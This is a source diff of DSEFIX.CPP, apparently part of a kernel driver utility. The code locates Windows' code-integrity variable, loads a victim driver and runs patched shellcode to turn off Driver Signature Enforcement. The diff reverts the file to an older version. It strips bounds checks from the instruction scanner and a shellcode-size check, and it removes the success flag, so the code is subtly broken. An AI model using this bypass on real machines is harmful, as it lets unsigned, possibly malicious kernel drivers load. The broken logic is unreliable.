@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2025
+*  (C) COPYRIGHT AUTHORS, 2014 - 2023
 *
 *  TITLE:       DSEFIX.CPP
 *
-*  VERSION:     1.45
+*  VERSION:     1.32
 *
-*  DATE:        02 Dec 2025
+*  DATE:        20 May 2023
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -39,123 +39,86 @@ extern "C" {
 }
 #endif
 
-/*
-* KDUpValidateInstructionBlock
-*
-* Purpose:
-*
-* Validate g_CiOptions call parameters block.
-*
-*/
-ULONG KDUpValidateInstructionBlock(
+ULONG KDUpCheckInstructionBlock(
     _In_ PBYTE Code,
-    _In_ ULONG Offset,
-    _In_ ULONG MaxLength
+    _In_ ULONG Offset
 )
 {
     ULONG offset = Offset;
     hde64s hs;
 
-    if (Code == NULL || MaxLength < 16)
-        return 0;
-
-    if (offset >= MaxLength)
-        return 0;
-
-    //
-    // 1) mov r9, rbx (4C 8B CB)
-    //
     RtlSecureZeroMemory(&hs, sizeof(hs));
-    hde64_disasm(&Code[offset], &hs);
-    if ((hs.flags & F_ERROR) || (hs.len != 3))
-        return 0;
 
-    if (!(Code[offset] == 0x4C) && (Code[offset + 1] == 0x8B))
-        return 0;
-
-    offset += hs.len;
-    if (offset >= MaxLength)
-        return 0;
-
-    //
-    // 2) mov r8, rdi(4C 8B C7)  OR mov r8d, edi(44 8B C7)
-    //
-    RtlSecureZeroMemory(&hs, sizeof(hs));
-    hde64_disasm(&Code[offset], &hs);
-    if ((hs.flags & F_ERROR) || (hs.len != 3)) {
-        return 0;
-    }
-
-    if (!((Code[offset] == 0x4C && Code[offset + 1] == 0x8B) ||
-        (Code[offset] == 0x44 && Code[offset + 1] == 0x8B)))
-    {
-        return 0;
-    }
-
-    offset += hs.len;
-    if (offset >= MaxLength)
-        return 0;
-
-    //
-    // 3) Either:
-    //      mov rdx, rsi            (48 8B D6) len=3
-    //    OR
-    //      mov [rsp+..], rax       (48 89 ?? ??) len=5
-    //      mov rdx, rsi            (48 8B D6) len=3
-    //
-    RtlSecureZeroMemory(&hs, sizeof(hs));
     hde64_disasm(&Code[offset], &hs);
     if (hs.flags & F_ERROR)
         return 0;
 
-    if (hs.len == 3) {
+    if (hs.len != 3)
+        return 0;
 
-        if (!(Code[offset] == 0x48 && Code[offset + 1] == 0x8B))
-            return 0;
-
-        offset += hs.len;
-
-    }
-    else if (hs.len == 5)
+    //
+    // mov     r9, rbx
+    //
+    if (Code[offset] != 0x4C ||
+        Code[offset + 1] != 0x8B)
     {
-        if (!(Code[offset] == 0x48 && Code[offset + 1] == 0x89))
-            return 0;
-
-        offset += hs.len;
-        if (offset >= MaxLength)
-            return 0;
-
-        RtlSecureZeroMemory(&hs, sizeof(hs));
-        hde64_disasm(&Code[offset], &hs);
-        if (hs.flags & F_ERROR || hs.len != 3)
-            return 0;
-
-        if (!(Code[offset] == 0x48 && Code[offset + 1] == 0x8B))
-            return 0;
-
-        offset += hs.len;
-    }
-    else {
         return 0;
     }
-
-    if (offset >= MaxLength)
-        return 0;
-
-    //
-    // 4) mov ecx, ebp (8B CD) len=2
-    //
-    RtlSecureZeroMemory(&hs, sizeof(hs));
-    hde64_disasm(&Code[offset], &hs);
-    if ((hs.flags & F_ERROR) || (hs.len != 2))
-        return 0;
-
-    if (!(Code[offset] == 0x8B && Code[offset + 1] == 0xCD))
-        return 0;
 
     offset += hs.len;
 
-    return offset;
+    hde64_disasm(&Code[offset], &hs);
+    if (hs.flags & F_ERROR)
+        return 0;
+
+    if (hs.len != 3)
+        return 0;
+
+    //
+    // mov     r8, rdi
+    //
+    if (Code[offset] != 0x4C ||
+        Code[offset + 1] != 0x8B)
+    {
+        return 0;
+    }
+
+    offset += hs.len;
+
+    hde64_disasm(&Code[offset], &hs);
+    if (hs.flags & F_ERROR)
+        return 0;
+    if (hs.len != 3)
+        return 0;
+
+    //
+    // mov     rdx, rsi
+    //
+    if (Code[offset] != 0x48 ||
+        Code[offset + 1] != 0x8B)
+    {
+        return 0;
+    }
+
+    offset += hs.len;
+
+    hde64_disasm(&Code[offset], &hs);
+    if (hs.flags & F_ERROR)
+        return 0;
+
+    if (hs.len != 2)
+        return 0;
+
+    //
+    // mov     ecx, ebp
+    //
+    if (Code[offset] != 0x8B ||
+        Code[offset + 1] != 0xCD)
+    {
+        return 0;
+    }
+
+    return offset + hs.len;
 }
 
 /*
@@ -276,7 +239,9 @@ NTSTATUS KDUQueryCiOptions(
                 //
                 // Parameters for the CipInitialize.
                 //
-                k = KDUpValidateInstructionBlock(ptrCode, offset, 256);
+                k = KDUpCheckInstructionBlock(ptrCode,
+                    offset);
+
                 if (k != 0) {
 
                     expectedLength = 5;
@@ -362,13 +327,6 @@ ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
 
     WCHAR szFullModuleName[MAX_PATH * 2];
 
-    if (symInit() == FALSE)
-        return 0;
-
-    szFullModuleName[0] = 0;
-    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
-        return 0;
-
     if (NtBuildNumber < NT_WIN8_RTM) {
         lpModuleName = (LPWSTR)NTOSKRNL_EXE;
         lpSymbolName = (LPCSTR)"g_CiEnabled";
@@ -377,25 +335,16 @@ ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
         lpModuleName = (LPWSTR)CI_DLL;
         lpSymbolName = (LPCSTR)"g_CiOptions";
     }
+
+    if (symInit() == FALSE)
+        return 0;
+
+    szFullModuleName[0] = 0;
+    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
+        return 0;
+
     _strcat(szFullModuleName, TEXT("\\"));
     _strcat(szFullModuleName, lpModuleName);
-
-    //
-    // Query loaded (kernel) base of target module.
-    //
-    if (NtBuildNumber < NT_WIN8_RTM) {
-        imageLoadedBase = supGetNtOsBase();
-    }
-    else {
-        imageLoadedBase = supGetModuleBaseByName(lpModuleName, NULL);
-    }
-
-    if (imageLoadedBase == 0) {
-        supPrintfEvent(kduEventError,
-            "[!] Could not query \"%ws\" loaded base\r\n",
-            lpModuleName);
-        return 0;
-    }
 
     //
     // Preload module for pattern search.
@@ -404,6 +353,8 @@ ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
     if (mappedImageBase) {
 
         printf_s("[+] Module \"%ws\" loaded for symbols lookup\r\n", lpModuleName);
+
+        imageLoadedBase = supGetNtOsBase();
 
         if (symLoadImageSymbols(lpModuleName, (PVOID)mappedImageBase, 0)) {
 
@@ -426,6 +377,9 @@ ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
     }
     else {
 
+        //
+        // Output error.
+        //
         supPrintfEvent(kduEventError,
             "[!] Could not load \"%ws\", GetLastError %lu\r\n",
             lpModuleName,
@@ -568,7 +522,7 @@ BOOL KDUControlDSE2(
 {
     BOOL bResult = FALSE;
     BYTE shellBuffer[SHELLCODE_SMALL];
-    SIZE_T shellSize;
+    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;
 
     KDU_PROVIDER* prov;
     KDU_VICTIM_PROVIDER* victimProv;
@@ -580,56 +534,45 @@ BOOL KDUControlDSE2(
     prov = Context->Provider;
     victimProv = Context->Victim;
 
-    shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;
-
-    //
-    // Validate shell size.
-    //
-    // 0xC offset + sizeof(ULONG_PTR)
-    //
-    if (shellSize < 20) {
-        supPrintfEvent(kduEventError, 
-            "[!] Shellcode too small for required patch offsets (size=0x%llX)\r\n", shellSize);
-        return FALSE;
-    }
-    
-    if (shellSize > SHELLCODE_SMALL) {
-        supPrintfEvent(kduEventError,
-            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);
-
-        return FALSE;
-    }
-    
-    //
-    // Copy and patch shellcode.
-    //
     RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
     RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);
 
     *(PULONG_PTR)&shellBuffer[0x2] = Address;
     *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;
 
+
+    if (shellSize > SHELLCODE_SMALL) {
+        supPrintfEvent(kduEventError,
+            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);
+
+        return FALSE;
+    }
+
+    //
+    // Load/open victim.
+    //
+    if (VpCreate(victimProv,
+        Context->ModuleBase,
+        &victimDeviceHandle, 
+        NULL, 
+        NULL))
+    {
+        printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
+    }
+    else {
+
+        supPrintfEvent(kduEventError,
+            "[!] Error preloading victim driver, abort\r\n");
+
+        return FALSE;
+    }
+
     printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
         (PVOID)Address,
         DSEValue);
 
-    //
-    // Preload / open victim driver.
-    //
-    if (!VpCreate(victimProv,
-        Context->ModuleBase,
-        &victimDeviceHandle,
-        NULL,
-        NULL))
-    {
-        supPrintfEvent(kduEventError,
-            "[!] Error preloading victim driver, abort\r\n");
-        return FALSE;
-    }
-
-    printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
-
     RtlSecureZeroMemory(&vi, sizeof(vi));
+
     if (!VpQueryInformation(
         Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
     {
@@ -669,10 +612,16 @@ BOOL KDUControlDSE2(
 
             supPrintfEvent(kduEventInformation,
                 "[+] DSE patch executed successfully\r\n");
-
-            bResult = TRUE;
         }
 
+    }
+
+    //
+    // Ensure victim handle is closed.
+    //
+    if (victimDeviceHandle) {
+        NtClose(victimDeviceHandle);
+        victimDeviceHandle = NULL;
     }
 
     //
